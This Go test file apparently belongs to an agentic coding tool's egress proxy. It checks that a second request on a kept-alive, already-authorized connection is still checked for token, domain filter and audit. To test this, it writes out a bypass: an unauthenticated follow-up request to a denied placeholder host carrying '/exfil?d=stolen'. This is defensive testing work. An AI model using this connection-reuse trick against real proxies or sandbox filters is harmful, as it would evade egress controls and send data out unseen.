//go:build vuln

package netproxy

import (
	"bufio"
	"context"
	"encoding/base64"
	"fmt"
	"net"
	"net/http"
	"net/netip"
	"sync"
	"testing"
	"time"

	"github.com/TNG/oh-my-agentic-coder/internal/sectest"
)

// TestSecurityKeepAliveConnectionReevaluatesEveryRequest asserts that a
// second HTTP request on an already-authorized, kept-alive proxy
// connection is still subject to the token check, the domain filter, and
// audit — not silently forwarded to whatever host it names.
//
// handleForward admits and dials once per TCP connection, then splices the
// raw socket for the rest of its life. A client that keeps the connection
// open (ordinary HTTP/1.1 keep-alive behaviour) can send a second request
// naming an explicitly denied host with no further Proxy-Authorization
// header and no further filter decision — it rides the already-open pipe.
func TestSecurityKeepAliveConnectionReevaluatesEveryRequest(t *testing.T) {
	sectest.RequireLoopbackListener(t)

	originLn, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer originLn.Close()
	var mu sync.Mutex
	var seen []string
	go func() {
		for {
			c, err := originLn.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				defer c.Close()
				br := bufio.NewReader(c)
				for {
					req, err := http.ReadRequest(br)
					if err != nil {
						return
					}
					mu.Lock()
					seen = append(seen, req.Host+" "+req.URL.RequestURI())
					mu.Unlock()
					fmt.Fprint(c, "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: keep-alive\r\n\r\nok")
				}
			}(c)
		}
	}()
	originPort := originLn.Addr().(*net.TCPAddr).Port

	filter := NewFilter(FilterConfig{
		AllowDomains: []string{"allowed.example"},
		DenyDomains:  []string{"forbidden.example"},
		Resolve: func(context.Context, string) ([]netip.Addr, error) {
			return []netip.Addr{netip.MustParseAddr("127.0.0.1")}, nil
		},
	})
	s, err := NewServer(filter, NewDirectDialer(), func(string, ...any) {})
	if err != nil {
		t.Fatal(err)
	}
	if err := s.Start(); err != nil {
		t.Fatal(err)
	}
	defer s.Close()

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	auth := "Basic " + base64.StdEncoding.EncodeToString([]byte("omac:"+s.Token()))

	fmt.Fprintf(conn, "GET http://allowed.example:%d/first HTTP/1.1\r\nHost: allowed.example:%d\r\nProxy-Authorization: %s\r\n\r\n", originPort, originPort, auth)
	br := bufio.NewReader(conn)
	resp1, err := http.ReadResponse(br, nil)
	if err != nil {
		t.Fatalf("read response 1: %v", err)
	}
	resp1.Body.Close()

	// Control: the first, properly authorized request to an allowed host
	// succeeded and reached the origin, so a fixture that never gets a
	// connection off the ground can't be mistaken for the property
	// holding.
	if resp1.StatusCode != http.StatusOK {
		t.Fatalf("control: the first, authorized request did not succeed (status %d): the fixture is broken, not the security property", resp1.StatusCode)
	}

	// Second request, same TCP connection, no Proxy-Authorization header,
	// naming an EXPLICITLY DENIED host — exactly what an ordinary
	// keep-alive HTTP client does next.
	fmt.Fprintf(conn, "GET http://forbidden.example:%d/exfil?d=stolen HTTP/1.1\r\nHost: forbidden.example:%d\r\n\r\n", originPort, originPort)
	resp2, err := http.ReadResponse(br, nil)
	if err != nil {
		return // connection closed/refused: the property holds
	}
	resp2.Body.Close()

	mu.Lock()
	reachedForbidden := len(seen) >= 2
	mu.Unlock()

	if resp2.StatusCode == http.StatusOK && reachedForbidden {
		t.Errorf("a second request on an already-authorized kept-alive connection reached an explicitly denied host (%v) with no token check, no filter decision, and no audit event for it", seen)
	}
}
